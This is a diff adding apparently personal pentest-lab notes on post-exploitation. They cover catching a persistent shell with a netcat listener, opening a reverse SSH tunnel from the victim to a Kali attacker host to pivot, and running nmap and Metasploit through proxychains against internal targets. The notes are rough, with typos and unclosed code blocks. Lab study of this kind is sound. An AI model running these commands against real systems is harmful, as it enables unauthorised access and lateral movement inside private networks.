@@ -1,0 +1,93 @@
+#Changing Targets VICTIM 2
+
+
+
+## Introduction
+
+
+
+Here You will find techniques PERSISTENT SHELL, PIVIOT, AND PING SWEEP.
+
+
+
+## Section 1: CATCH PERSISTENT SHELL
+
+
+
+### (ATTACKER)
+
+
+
+```bash
+# nc -lvp 55556
+upgrade shell
+
+
+
+
+
+
+## NEXT CONDUCT A PIVIOT
+
+
+
+### (ATTACKER)
+
+
+
+```bash
+# netstat -natp
+# netstat -natp | grep LISTEN
+
+
+
+_AFTER CATCHING PERSISTENT SHELL (USE YOUR SSH PORT)
+_OPEN SSH FOR LISTNER TO SET UP PROXY
+
+
+
+```bash
+#sudo systemctl status ssh.service
+#sudo systemctl start ssh.service
+
+
+
+### (VICTIM)
+```bash
+# ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55555
+
+
+
+(MAKE SURE PORT FWD RULE IS GOOD ON PFSENSE SSH PORT 22)
+if it states port fowarding failed it means you alrady have ypur proxy open
+(VICTIM) should be promted a password
+
+
+
+## NEXT CONDUCT A PING SWEEP
+
+
+
+_NOTE: YOUR DIRECTORIES MAY VARY COMPARED TO MY EXAMPLE DEPENDING HOW AND WHERE YOUR SCOPE FILE IS ON KALI
+
+
+
+### (ATTACKER)
+```bash
+# LS
+# CD INTERNAL
+_(SHOULD SEE IP'S PING SWEEPS AND TARGETS)
+# LS
+# CD 192.168.1.102 (=SOC4)
+# sudo proxychains nmap -iL scope -F -Pn -sT | tee fast_scan
+
+
+
+_USE A THIRD TERMINAL
+```bash
+# sudo proxychains msfconsole [1:24:44]
+
+
+
+*** continued... on Metasploit through proxy chains ***
+
